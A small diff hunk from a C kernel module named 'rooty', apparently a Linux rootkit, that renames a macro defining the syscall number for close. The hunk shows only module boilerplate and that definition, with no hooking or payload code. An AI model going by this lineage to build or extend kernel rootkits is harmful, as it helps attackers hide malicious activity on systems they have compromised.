@@ -8,7 +8,7 @@ void rooty_exit(void);
 module_init(rooty_init);
 module_exit(rooty_exit);
 
-#define __NR_close (__NR_SYSCALL_BASE+ 6) 
+#define __NR_CLOSE (__NR_SYSCALL_BASE+ 6) 
 
 /* define what Architecture is used */
 #if defined(__i386__)
